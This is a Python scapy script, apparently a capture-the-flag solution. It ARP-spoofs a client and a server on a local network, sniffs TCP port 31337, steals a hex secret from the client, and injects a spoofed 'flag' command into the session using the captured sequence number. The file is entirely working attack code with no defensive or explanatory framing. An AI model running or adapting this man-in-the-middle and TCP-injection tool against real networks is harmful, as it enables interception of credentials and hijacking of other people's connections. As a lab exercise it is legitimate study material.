#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys
import threading
import os

attacker_mac = scapy.get_if_hwaddr("eth0")

client_ip = "1.1.1.2"
client_mac = "8a:54:54:b6:2b:41"

server_ip = "1.1.1.3"
server_mac = "e6:df:c0:23:e7:40"

target_port = 31337

interface = "eth0"

current_secret = None
expected_seq = None
client_source_port = None


def arp_spoof():
    print("[*] Starting ARP spoofing...")
    client_poison = scapy.Ether(dst=client_mac, src=attacker_mac) / scapy.ARP(op=2, psrc=server_ip, hwsrc=attacker_mac, pdst=client_ip)
    server_poison = scapy.Ether(dst=server_mac, src=attacker_mac) / scapy.ARP(op=2, psrc=client_ip, hwsrc=attacker_mac, pdst=server_ip)

    try:
        while True:
            scapy.sendp([client_poison, server_poison], verbose=0, iface=interface)
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass


def handle_packet(pkt):
    global current_secret, expected_seq, client_source_port, stop_sniffing, stop_spoofing

    if not pkt.haslayer(scapy.IP) or not pkt.haslayer(scapy.TCP) or (pkt[scapy.IP].src != client_ip and pkt[scapy.IP].src != server_ip) or (pkt[scapy.IP].dst != client_ip and pkt[scapy.IP].dst != server_ip) or (pkt[scapy.TCP].sport != target_port and pkt[scapy.TCP].dport != target_port):
        return

    processed = False

    if pkt[scapy.IP].src == server_ip and pkt.haslayer(scapy.Raw) and b"secret: " in pkt[scapy.Raw].load:
        print("[+] Intercepted secret prompt from server")
        processed = True

    if pkt[scapy.IP].src == client_ip and pkt[scapy.IP].dst == server_ip and pkt.haslayer(scapy.Raw) and current_secret is None:
        try:
            payload = pkt[scapy.Raw].load.strip()
            secret_bytes = bytes.fromhex(payload.decode())

            if len(secret_bytes) == 32:
                current_secret = payload.decode()
                print(f"[+] Captured valid secret: {current_secret}")

                expected_seq = pkt[scapy.TCP].seq + len(pkt[scapy.Raw].load)
                client_source_port = pkt[scapy.TCP].sport

                if current_secret is not None and expected_seq is not None and client_source_port is not None:
                    print("[+] Injecting 'flag' command immediately after secret...")

                    ip_layer = scapy.IP(src=client_ip, dst=server_ip)

                    tcp_layer = scapy.TCP(sport=client_source_port, dport=target_port, seq=expected_seq, ack=pkt[scapy.TCP].ack, flags="PA")

                    payload = b"flag"
                    injection_packet = scapy.Ether(src=attacker_mac, dst=server_mac) / ip_layer / tcp_layer / payload

                    scapy.sendp(injection_packet, verbose=0, iface=interface)
                    print("[+] 'flag' command injected.")

                    stop_sniffing = True
                    stop_spoofing = True

                processed = True

        except ValueError:
            pass
    if pkt[scapy.IP].src == server_ip and pkt[scapy.IP].dst == client_ip and pkt.haslayer(scapy.Raw) and b"command: " in pkt[scapy.Raw].load:
        print("[+] Command prompt intercepted (after secret captured)")
        processed = True

    if pkt[scapy.IP].src == server_ip and pkt[scapy.IP].dst == client_ip and pkt.haslayer(scapy.Raw):
        print(f"\n[+++] FLAG CAPTURED: {pkt[scapy.Raw].load.decode().strip()}")
        stop_spoofing = True
        stop_sniffing = True
        processed = True
    if not processed:
        if pkt[scapy.IP].src == client_ip and pkt[scapy.IP].dst == server_ip:
            forward_pkt = scapy.Ether(src=attacker_mac, dst=server_mac) / pkt[scapy.IP]
            scapy.sendp(forward_pkt, verbose=0, iface=interface)
        elif pkt[scapy.IP].src == server_ip and pkt[scapy.IP].dst == client_ip:
            forward_pkt = scapy.Ether(src=attacker_mac, dst=client_mac) / pkt[scapy.IP]
            scapy.sendp(forward_pkt, verbose=0, iface=interface)


stop_spoofing = False
stop_sniffing = False


def main():
    global stop_spoofing, stop_sniffing
    if os.geteuid() != 0:
        print("[-] This script requires root privileges. Please run with sudo.")
        sys.exit(1)

    arp_thread = threading.Thread(target=arp_spoof, daemon=True)
    arp_thread.start()

    time.sleep(5)

    print("[+] Starting packet sniffing...")
    print("[+] Waiting for secret exchange and command prompt...")
    bpf_filter = f"tcp port {target_port} and " f"(host {client_ip} or host {server_ip})"

    scapy.sniff(filter=bpf_filter, prn=handle_packet, store=0, iface=interface, stop_filter=lambda x: stop_sniffing)

    if arp_thread.is_alive():
        stop_spoofing = True
        arp_thread.join(timeout=2)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user.")
    finally:
        print("\n[!] Restoring ARP tables...")
        scapy.sendp(scapy.Ether(dst=client_mac, src=attacker_mac) / scapy.ARP(op=2, psrc=server_ip, hwsrc=server_mac, pdst=client_ip), count=5, verbose=0, iface=interface)
        scapy.sendp(scapy.Ether(dst=server_mac, src=attacker_mac) / scapy.ARP(op=2, psrc=client_ip, hwsrc=client_mac, pdst=server_ip), count=5, verbose=0, iface=interface)
        print("[+] ARP tables restored.")
